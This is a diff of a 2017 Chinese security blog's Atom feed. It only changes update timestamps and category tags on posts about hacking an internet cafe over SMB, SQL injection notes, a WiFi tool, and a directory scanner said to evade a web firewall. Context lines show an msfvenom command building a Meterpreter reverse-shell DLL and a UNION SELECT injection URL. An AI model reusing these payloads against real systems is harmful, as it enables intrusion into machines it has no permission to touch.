@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://loid.online/"/>
-  <updated>2017-04-15T16:01:38.989Z</updated>
+  <updated>2017-04-19T07:10:26.098Z</updated>
   <id>http://loid.online/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://loid.online/2017/04/15/hack-Net-bar-by-Windows-smb/"/>
     <id>http://loid.online/2017/04/15/hack-Net-bar-by-Windows-smb/</id>
     <published>2017-04-15T15:39:11.000Z</published>
-    <updated>2017-04-15T16:01:38.989Z</updated>
+    <updated>2017-04-19T07:10:26.098Z</updated>
     
     <content type="html"><![CDATA[<h3 id="这才是日网吧的正确姿势"><a href="#这才是日网吧的正确姿势" class="headerlink" title="这才是日网吧的正确姿势!"></a>这才是日网吧的正确姿势!</h3><hr>
 <blockquote>
@@ -73,6 +73,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=6666 -f dll
     </summary>
     
     
+      <category term="漏洞" scheme="http://loid.online/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="实战" scheme="http://loid.online/tags/%E5%AE%9E%E6%88%98/"/>
+    
   </entry>
   
   <entry>
@@ -80,7 +84,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=6666 -f dll
     <link href="http://loid.online/2017/04/11/SQL-Injection-Study/"/>
     <id>http://loid.online/2017/04/11/SQL-Injection-Study/</id>
     <published>2017-04-10T19:01:01.000Z</published>
-    <updated>2017-04-10T20:17:07.066Z</updated>
+    <updated>2017-04-19T07:11:58.443Z</updated>
     
     <content type="html"><![CDATA[<h2 id="SQL注入攻击学习笔记"><a href="#SQL注入攻击学习笔记" class="headerlink" title="SQL注入攻击学习笔记"></a>SQL注入攻击学习笔记</h2><hr>
 <ul>
@@ -170,6 +174,14 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
     </summary>
     
     
+      <category term="漏洞" scheme="http://loid.online/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="web" scheme="http://loid.online/tags/web/"/>
+    
+      <category term="渗透" scheme="http://loid.online/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="笔记" scheme="http://loid.online/tags/%E7%AC%94%E8%AE%B0/"/>
+    
   </entry>
   
   <entry>
@@ -177,7 +189,7 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
     <link href="http://loid.online/2017/03/29/WiFi-Hacker-for-Web/"/>
     <id>http://loid.online/2017/03/29/WiFi-Hacker-for-Web/</id>
     <published>2017-03-28T16:21:18.000Z</published>
-    <updated>2017-03-28T16:31:33.325Z</updated>
+    <updated>2017-04-19T07:12:01.647Z</updated>
     
     <content type="html"><![CDATA[<h2 id="挖坑：-WiFi在线工具集开发"><a href="#挖坑：-WiFi在线工具集开发" class="headerlink" title="挖坑： WiFi在线工具集开发"></a>挖坑： WiFi在线工具集开发</h2><p>利用暑假时间搞完</p>
 <hr>
@@ -206,6 +218,10 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
     
     </summary>
     
+    
+      <category term="Python" scheme="http://loid.online/tags/Python/"/>
+    
+      <category term="原创" scheme="http://loid.online/tags/%E5%8E%9F%E5%88%9B/"/>
     
   </entry>
   
@@ -243,9 +259,9 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
     </summary>
     
     
-      <category term="渗透" scheme="http://loid.online/tags/%E6%B8%97%E9%80%8F/"/>
-    
       <category term="web" scheme="http://loid.online/tags/web/"/>
+    
+      <category term="渗透" scheme="http://loid.online/tags/%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
@@ -254,7 +270,7 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
     <link href="http://loid.online/2017/03/15/DirScanner-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
     <id>http://loid.online/2017/03/15/DirScanner-多线程目录扫描器/</id>
     <published>2017-03-15T07:05:17.000Z</published>
-    <updated>2017-03-15T07:05:49.676Z</updated>
+    <updated>2017-04-19T07:09:15.513Z</updated>
     
     <content type="html"><![CDATA[<h2 id="DirScanner-Python网站路径扫描-多线程版"><a href="#DirScanner-Python网站路径扫描-多线程版" class="headerlink" title="DirScanner Python网站路径扫描-多线程版"></a>DirScanner Python网站路径扫描-多线程版</h2><p>过狗扫描,防止多线程被安全狗等防护拦截</p>
 <hr>
@@ -285,6 +301,12 @@ Options:
     
     </summary>
     
+      <category term="Python" scheme="http://loid.online/categories/Python/"/>
+    
+    
+      <category term="Python" scheme="http://loid.online/tags/Python/"/>
+    
+      <category term="原创" scheme="http://loid.online/tags/%E5%8E%9F%E5%88%9B/"/>
     
   </entry>
   
